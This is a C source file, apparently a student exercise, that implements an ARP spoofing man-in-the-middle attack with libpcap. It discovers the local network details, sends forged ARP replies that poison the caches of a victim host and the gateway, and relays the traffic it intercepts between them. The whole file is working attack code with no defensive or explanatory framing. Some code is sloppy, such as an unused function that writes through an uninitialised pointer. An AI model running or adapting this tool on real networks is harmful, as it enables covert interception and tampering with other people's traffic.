#include <stdio.h>
#include <pcap.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <string.h>

void attacker_network_info(char *dev, struct in_addr *attacker_ip, struct ether_addr *attacker_mac, struct in_addr *gateway_ip){
	char cmd[200], ip_imm[50], mac_imm[50], gateway_ip_imm[50];
	FILE *fp;

	sprintf(cmd, "ifconfig | grep -A 1 '%s' | grep 'inet addr' | awk '{print $2}' | awk -F':' '{print $2}'",dev);

	fp = popen(cmd, "r");
	fgets(ip_imm, sizeof(ip_imm), fp);
	pclose(fp);

	printf("attacker's ip: %s\n", ip_imm);

	inet_aton(ip_imm, attacker_ip);
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	sprintf(cmd, "ifconfig | grep '%s' | awk '{print$5}'",dev);
	
	fp = popen(cmd, "r");
	fgets(mac_imm, sizeof(mac_imm), fp);
	pclose(fp);

	printf("attacker's mac: %s\n", mac_imm);

	ether_aton_r(mac_imm, attacker_mac);
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	sprintf(cmd, "netstat -rn |grep -A 1 'Gateway' | awk '{print $2}' | awk '{print $1}' | tail -n 1");

	fp=popen(cmd, "r");
	fgets(gateway_ip_imm, sizeof(gateway_ip_imm), fp);
	pclose(fp);

	printf("attacker's gateway ip: %s\n", gateway_ip_imm);

	inet_aton(gateway_ip_imm, gateway_ip);
}

void arp_request(pcap_t *handle, struct in_addr * sender_ip, struct ether_addr *sender_mac, struct in_addr *target_ip, struct ether_addr *target_mac) {
	struct ether_header ether;
	struct ether_header *ether_reply;
	struct ether_arp arp;
	struct ether_arp *arp_reply;
	struct ether_addr destination, source;
	u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	struct pcap_pkthdr header;
	const u_char *reply;
	//struct ether_addr target_ip;
	//int i;
	char mac_imm[50];

	ether.ether_type = htons(ETHERTYPE_ARP); 

	ether_aton_r("ff:ff:ff:ff:ff:ff", &destination);

	memcpy(ether.ether_dhost, &destination.ether_addr_octet, ETHER_ADDR_LEN);

	memcpy(ether.ether_shost, sender_mac->ether_addr_octet, ETHER_ADDR_LEN);

	arp.arp_hrd = htons(ARPHRD_ETHER);
	arp.arp_pro = htons(ETHERTYPE_IP);
	arp.arp_hln = ETHER_ADDR_LEN;
	arp.arp_pln = sizeof(struct in_addr);
	arp.arp_op = htons(ARPOP_REQUEST);
	memcpy(&arp.arp_sha, sender_mac, ETHER_ADDR_LEN);
	/*for(i=0; i<6;i++)
		printf("%02X:", arp.arp_sha[i]);
	printf("\n");
	ether_ntoa_r(sender_mac, mac_imm);
	printf("attacker's mac: %s\n", mac_imm);*/

	memcpy(&arp.arp_spa, sender_ip, sizeof(struct in_addr));
	ether_aton_r("00:00:00:00:00:00", &source);
	memcpy(&arp.arp_tha, &source, ETHER_ADDR_LEN);
	memcpy(&arp.arp_tpa, target_ip, sizeof(struct in_addr));

	memcpy(packet, &ether, sizeof(struct ether_header));
	memcpy(packet+sizeof(struct ether_header), &arp, sizeof(struct ether_arp));
    while(1) {
    	if(pcap_sendpacket(handle, packet, sizeof(packet)) == -1)
    		printf("error\n");

    	reply = pcap_next(handle, &header);

    	if(reply != NULL) {
    		//printf("1\n");
    		ether_reply = (struct ether_header*)reply;
			
			if(ntohs(ether_reply->ether_type) != ETHERTYPE_ARP)
				continue;
			//printf("2\n");
			arp_reply = (struct ether_arp *)(reply+14);
			if(ntohs(arp_reply->arp_op) != ARPOP_REPLY)
				continue;
			//printf("3\n");
			if(memcmp(target_ip, arp_reply->arp_spa, sizeof(struct in_addr)) !=0)
				continue;
			//printf("4\n");
			if(memcmp(sender_ip, arp_reply->arp_tpa, sizeof(struct in_addr)) !=0)
				continue;
			//printf("5\n");

			memcpy(target_mac->ether_addr_octet, arp_reply->arp_sha, ETHER_ADDR_LEN);
			//printf("6\n");
			ether_ntoa_r(arp_reply->arp_sha, mac_imm);
			printf("mac: %s\n\n", mac_imm);
			break;
    	}

    }
}

void send_arp(pcap_t *handle, struct ether_addr *victim_mac, struct ether_addr *attacker_mac, struct in_addr *gateway_ip, struct in_addr *victim_ip) {
	struct ether_header ether;
	struct ether_header *ether_reply;
	struct ether_arp arp;
	struct ether_arp *arp_reply;
	u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	struct pcap_pkthdr header;
	const u_char *reply;
	struct ether_addr mac_reply;
	//int i;
	char mac_imm[50];
	struct ether_addr gateway_mac;

	ether.ether_type = htons(ETHERTYPE_ARP); 

	memcpy(ether.ether_dhost, victim_mac, ETHER_ADDR_LEN);

	memcpy(ether.ether_shost, attacker_mac, ETHER_ADDR_LEN);

	arp.arp_hrd = htons(ARPHRD_ETHER);
	arp.arp_pro = htons(ETHERTYPE_IP);
	arp.arp_hln = ETHER_ADDR_LEN;
	arp.arp_pln = sizeof(struct in_addr);
	arp.arp_op = htons(ARPOP_REPLY);
	memcpy(&arp.arp_sha, attacker_mac, ETHER_ADDR_LEN);
	/*for(i=0; i<6;i++)
		printf("%02X:", arp.arp_sha[i]);
	printf("\n");
	ether_ntoa_r(mac_attacker, mac_imm);
	printf("attacker's mac: %s\n", mac_imm);*/

	memcpy(&arp.arp_spa, gateway_ip, sizeof(struct in_addr));
	memcpy(&arp.arp_tha, victim_mac, ETHER_ADDR_LEN);
	memcpy(&arp.arp_tpa, victim_ip, sizeof(struct in_addr));

	memcpy(packet, &ether, sizeof(struct ether_header));
	memcpy(packet+sizeof(struct ether_header), &arp, sizeof(struct ether_arp));
    //while(1) {
    	if(pcap_sendpacket(handle, packet, sizeof(packet)) == -1)
    		printf("error1\n");
  	

    //}
}

void send_arp2(pcap_t *handle, struct ether_addr *attacker_mac, struct in_addr *gateway_ip) {
	struct ether_header ether;
	struct ether_header *ether_reply;
	struct ether_arp arp;
	struct ether_arp *arp_reply;
	u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	struct pcap_pkthdr header;
	const u_char *reply;
	struct ether_addr mac_reply, destination, target;
	struct in_addr *victim_ip;
	//int i;
	char mac_imm[50];
	struct ether_addr gateway_mac;

	ether.ether_type = htons(ETHERTYPE_ARP);

	ether_aton_r("ff:ff:ff:ff:ff:ff", &destination);

	memcpy(ether.ether_dhost, &destination, ETHER_ADDR_LEN);

	memcpy(ether.ether_shost, attacker_mac, ETHER_ADDR_LEN);

	arp.arp_hrd = htons(ARPHRD_ETHER);
	arp.arp_pro = htons(ETHERTYPE_IP);
	arp.arp_hln = ETHER_ADDR_LEN;
	arp.arp_pln = sizeof(struct in_addr);
	arp.arp_op = htons(ARPOP_REPLY);
	memcpy(&arp.arp_sha, attacker_mac, ETHER_ADDR_LEN);
	/*for(i=0; i<6;i++)
		printf("%02X:", arp.arp_sha[i]);
	printf("\n");
	ether_ntoa_r(mac_attacker, mac_imm);
	printf("attacker's mac: %s\n", mac_imm);*/

	memcpy(&arp.arp_spa, gateway_ip, sizeof(struct in_addr));

	ether_aton_r("00:00:00:00:00:00", &target);

	memcpy(&arp.arp_tha, &target, ETHER_ADDR_LEN);

	inet_aton("192.168.0.x", victim_ip);

	memcpy(&arp.arp_tpa, victim_ip, sizeof(struct in_addr));

	memcpy(packet, &ether, sizeof(struct ether_header));
	memcpy(packet+sizeof(struct ether_header), &arp, sizeof(struct ether_arp));
    //while(1) {
    	if(pcap_sendpacket(handle, packet, sizeof(packet)) == -1)
    		printf("error2\n");
  	

    //}
}

void arp_spoofing(pcap_t *handle, struct in_addr *attacker_ip, struct ether_addr *attacker_mac, struct in_addr *victim_ip, struct ether_addr *victim_mac, struct in_addr *gateway_ip, struct ether_addr *gateway_mac){
	struct ether_header ether;
	struct ether_header *ether_request;
	struct ether_arp arp;
	struct ether_arp *arp_request;
	u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
	struct pcap_pkthdr header;
	const u_char *request;
	struct ip *ipv4;
	const u_char copy_packet[10000] = {0};
	
	
	while(1) 
	{
		//send_arp(handle, victim_mac, attacker_mac, gateway_ip, victim_ip);
		//send_arp(handle, gateway_mac, attacker_mac, victim_ip, gateway_ip);

    	request = pcap_next(handle, &header);

    	if(request != NULL) 
    	{
    		ether_request = (struct ether_header*)request;
			
			if(ntohs(ether_request->ether_type) == ETHERTYPE_ARP)
			{
				arp_request = (struct ether_arp *)(request+14);
					////////////////////////////check victim's arp request///////////////////////////////
				if(memcmp(victim_ip, arp_request->arp_spa, sizeof(struct in_addr)) ==0)
				{
					if(memcmp(gateway_ip, arp_request->arp_tpa, sizeof(struct in_addr)) ==0)
						send_arp(handle, victim_mac, attacker_mac, gateway_ip, victim_ip);
				}
				/////////////////////////////check gateway's arp request////////////////////////////////////
				if(memcmp(gateway_ip, arp_request->arp_spa, sizeof(struct in_addr)) ==0)
				{
					if(memcmp(victim_ip, arp_request->arp_tpa, sizeof(struct in_addr)) ==0)
						send_arp(handle, gateway_mac, attacker_mac, victim_ip, gateway_ip);
				}
			}
			else if(ntohs(ether_request->ether_type) == ETHERTYPE_IP)
			{
				ipv4 = (struct ip*)(request+14);


				if((memcmp(ether_request->ether_shost, victim_mac, ETHER_ADDR_LEN) ==0) && memcmp(ether_request->ether_dhost, attacker_mac, ETHER_ADDR_LEN) == 0)
				{	
					if(memcmp(&ipv4->ip_dst, attacker_ip, sizeof(struct in_addr))!=0)
					{
						printf("victim sends ip packet\n");

						//ether.ether_type = ETHERTYPE_IP;

						//memcpy(ether.ether_dhost, gateway_mac, ETHER_ADDR_LEN);
						//memcpy(ether.ether_shost, attacker_mac, ETHER_ADDR_LEN);
						memcpy(&ether_request->ether_dhost, gateway_mac, ETHER_ADDR_LEN);
						memcpy(&ether_request->ether_shost, attacker_mac, ETHER_ADDR_LEN);

						printf("src mac: %s\n", ether_ntoa(ether_request->ether_shost));
						printf("dst mac: %s\n", ether_ntoa(ether_request->ether_dhost));
						//memcpy(request, &ether, sizeof(struct ether_header));
						//memcpy(copy_packet, &ether, sizeof(struct ether_header));
						//memcpy(copy_packet + sizeof(struct ether_header), request + sizeof(struct ether_header), header.caplen - sizeof(struct ether_header));

						if(pcap_sendpacket(handle, request, header.caplen) == -1)
							printf("error3\n");
					}
				}
				else if((memcmp(ether_request->ether_shost, gateway_mac, ETHER_ADDR_LEN) ==0) && memcmp(ether_request->ether_dhost, attacker_mac, ETHER_ADDR_LEN) == 0)
				{
					if(memcmp(&ipv4->ip_dst, victim_ip, sizeof(struct in_addr)) == 0)
					{
						printf("gateway sends ip packet\n");

						ether.ether_type  = ETHERTYPE_IP;

						//memcpy(ether.ether_dhost, victim_mac, ETHER_ADDR_LEN);
						//memcpy(ether.ether_shost, attacker_mac, ETHER_ADDR_LEN);
						memcpy(&ether_request->ether_dhost, victim_mac, ETHER_ADDR_LEN);
						memcpy(&ether_request->ether_shost, attacker_mac, ETHER_ADDR_LEN);
						//memcpy(request, &ether, sizeof(struct ether_header));
						//memcpy(copy_packet, &ether, sizeof(struct ether_header));
						//memcpy(copy_packet + sizeof(struct ether_header), request + sizeof(struct ether_header), header.caplen - sizeof(struct ether_header));

						if(pcap_sendpacket(handle, request, header.caplen) == -1)
							printf("error4\n");
					}
				}
			}
    	}
    }
}

/*void send_ip() 
{
	packet = pcap_next(handle, &header);

	if(packet != NULL)
	{
		ether = (struct ether_header*)packet;
		if(ntohs(ether->ether_type) == ETHERTYPE_IP)
		{
			if((memcmp(ether.ether_shost, victim_mac, ETHER_ADDR_LEN) ==0) && memcmp(ether.ether_dhost, attacker_mac, ETHER_ADDR_LEN) == 0)
			{
				memcpy(ether.ether_dhost, gateway_mac, ETHER_ADDR_LEN);
				memcpy(ether.ether_shost, attacker_mac, ETHER_ADDR_LEN);
				memcpy(packet, &ether, sizeof(struct ether_header));
				if(pcap_sendpacket(handle, packet, sizeof(packet)) == -1)
					printf("error\n");
			}
		}
	}
}*/


int main(int argc, char *argv[])
{
	char *dev, errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle;
	struct pcap_pkthdr header;
	const u_char *packet;
	struct ether_header *ether;
	struct ip *ipv4;
	struct tcphdr *tcp;
	struct arpheader *arphdr;
	int ip_hl, tcp_hl, total_hl, data_size;
	int i;
	struct ether_addr alonso_mac;
	struct in_addr alonso_ip, gateway_ip;
	struct ether_addr gateway_mac;
	struct ether_addr dlghwns817_mac;
	struct in_addr dlghwns817_ip;

	inet_aton(argv[1], &dlghwns817_ip);


	dev = pcap_lookupdev(errbuf);
	if(dev == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}

	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}
	
	printf("Device: %s\n\n", dev);

	attacker_network_info(dev, &alonso_ip, &alonso_mac, &gateway_ip);
	arp_request(handle, &alonso_ip, &alonso_mac, &gateway_ip, &gateway_mac);
	arp_request(handle, &alonso_ip, &alonso_mac, &dlghwns817_ip, &dlghwns817_mac);
	send_arp(handle, &dlghwns817_mac, &alonso_mac, &gateway_ip, &dlghwns817_ip);
	//send_arp2(handle, &alonso_mac, &gateway_ip);
	send_arp(handle, &gateway_mac, &alonso_mac, &dlghwns817_ip, &gateway_ip);
	arp_spoofing(handle, &alonso_ip, &alonso_mac, &dlghwns817_ip, &dlghwns817_mac, &gateway_ip, &gateway_mac);
	

	
	return(0);
}
